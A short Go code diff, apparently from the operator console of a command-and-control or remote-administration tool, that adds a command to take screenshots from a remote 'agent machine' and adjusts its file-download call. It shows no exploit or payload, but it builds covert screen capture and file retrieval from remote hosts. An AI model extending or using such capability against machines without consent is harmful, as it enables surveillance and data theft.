@@ -6,6 +6,7 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"time"
 )
 
 func ShowHandler(command []string, agent string) {
@@ -90,7 +91,7 @@ func DownloadFile(agent string, command []string) {
 	if len(command) > 1 {
 		agentID, _ := strconv.Atoi(agent)
 		fileName := filepath.Base(command[1])
-		err := controllers.ReqFile(uint64(agentID), command[1], fileName)
+		err := controllers.ReqFile(uint64(agentID), command[1], fileName, "download")
 		if err != nil {
 			fmt.Println()
 			fmt.Println("Error to download the file: ", err)
@@ -104,6 +105,17 @@ func DownloadFile(agent string, command []string) {
 	}
 }
 
+func TakeScrenshot(agent string, command []string) {
+	agentID, _ := strconv.Atoi(agent)
+	ct := time.Now()
+	fileName := "./ss-" + ct.Format("2006-01-02-15-04-05") + ".png"
+	err := controllers.ReqFile(uint64(agentID), "screenshot", fileName, "screenshot")
+	if err != nil {
+		fmt.Println()
+		fmt.Println("Error to take screenshot the file: ", err)
+		fmt.Println()
+	}
+}
 
 func Help() string {
 	help := `
@@ -119,6 +131,8 @@ func Help() string {
 	AGENT COMMANDS:
 
 		download <filepath>: download a file from agent machine.
+
+		screenshot: take a screenshot from agent machine.
 
 		show history: list the command history when one agent is selected.
 
